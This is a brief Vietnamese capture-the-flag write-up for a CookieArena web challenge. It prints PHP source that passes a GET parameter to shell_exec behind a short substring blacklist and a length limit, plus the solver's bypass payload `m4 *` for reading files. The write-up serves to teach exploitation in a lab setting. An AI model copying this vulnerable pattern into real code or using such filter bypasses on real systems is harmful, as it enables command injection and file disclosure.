# Command Limit Length
Link: https://battle.cookiearena.org/challenges/web/command-limit-length

![alt text](image.png)

Bài này liên quan đến cmli, nhưng bị filter một vài lệnh và giới hạn chỉ 5 kí tự

Source php:
```php
$title = "Baby RCE Bonepest";
$description = "Baby RCE Bonepest";
$message = "You only use id` and `ps` command";

$start = $_GET['start'];

$blacklist = array (
    'ss, 'sc', 'aa', 'od', 'pr',
    'pw', 'pf', 'ps', 'pa', 'pd',
    'pp', 'po', 'pc', 'pz', 'pq',
    'pu', 'pv', 'pw', 'px', 'ls',    
    'dd', 'nl', 'nk', 'df', 'wc',
    'du', 'll', 'rm', 'vi', 'ln',
    'cp', 'sh', 'su', 'ex', 'ab'
);


$valid = true;
foreach($blacklist as $blackItem) {
    if(strpos($start, $blackItem) !== false) {
        $valid = false;
        break;
    }
}

if(!$valid) {
    $message = 'Please enter a valid command!';
} else {
    if (strlen($start) < 5) {
        $message = shell_exec($start);
        if(empty($message)) {
            $message = "Command not found";
        }
    } else {
        $message = "The command is not greater than 5 characters!";
    }
}
?>
```

Mình đã gặp dạng này khá nhiều và kinh nghiệm lần trước đó mách bảo mình sử dụng lệnh m4 cũng có tác dụng tương tự để đọc file

payload: `m4 *`

![alt text](image-1.png)